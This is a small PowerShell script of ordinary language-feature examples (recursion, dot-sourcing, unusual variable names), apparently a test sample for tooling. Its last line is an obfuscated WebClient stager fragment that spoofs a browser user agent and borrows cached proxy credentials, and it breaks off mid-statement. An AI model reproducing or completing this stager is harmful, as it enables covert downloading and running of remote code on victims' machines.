function My-Function ($myInput)
{
    My-Function $myInput
}

$things = 4

$things
My-Function $things

Write-Output "Hi";

Write-Output ""

. .\VariableDefinition.ps1
Write-Output $variableInOtherFile

${variable-with-weird-name} = "this variable has special characters"
Write-Output ${variable-with-weird-name}

$wc=New-ObjEct SySTEM.NET.WebClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadeRS.AdD('User-Agent',$u);$Wc.PrOxY = [SYsTEM.NeT.WeBREqUeST]::DeFaulTWEBPROXy;$wC.ProXY.CrEDeNtiaLS = [SyStEm.Net.CREDentIalCAChE]::DefAULtNetwoRkCREdenTiAlS;$K='/j(\wly4+aW

